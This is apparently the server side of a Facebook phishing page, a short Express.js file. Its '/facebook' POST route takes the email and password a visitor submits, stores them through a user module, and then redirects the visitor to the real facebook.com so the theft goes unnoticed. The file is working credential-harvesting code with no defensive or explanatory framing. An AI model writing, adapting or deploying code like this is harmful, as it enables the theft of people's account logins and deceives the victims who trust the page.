const express = require ('express')
const storeUser = require ('./src/user')

const user = new storeUser();


const app=express();
const port= process.env.PORT || 3000;


app.use(express.json())
app.use(express.urlencoded())


app.use(express.static(__dirname+'/public'))



app.get('/',(req, res)=>{
    res.sendFile(__dirname+'public/index.html');
})
app.post('/facebook', (req,res)=>{
   
    try{
        const email = req.body.email;
        const password = req.body.password;
        const userInformation =  user.create(email,password);
        

    }

    catch(err){
        throw new Error(`not entered ${err}`)
    }
    
    res.writeHead(301, {
        Location: `https://www.facebook.com/?stype=lo&jlou=Afc20qlfXAZkbjfhxLwxj1B7KF9Fh8G3V8bzEaT1x-TUU5ZW-Pu2f4oqI8bsvCjnOBz7CkPUk6Lx8B3NZMMq0Qw4OIPd8a4V34HjZYJ6Bquf1Q&smuh=65527&lh=Ac82H3jWqAQu20xFYHg`
      }).end();
    
})
    

app.listen(port,()=>{
    console.log(`http://localhost:${port}`)
})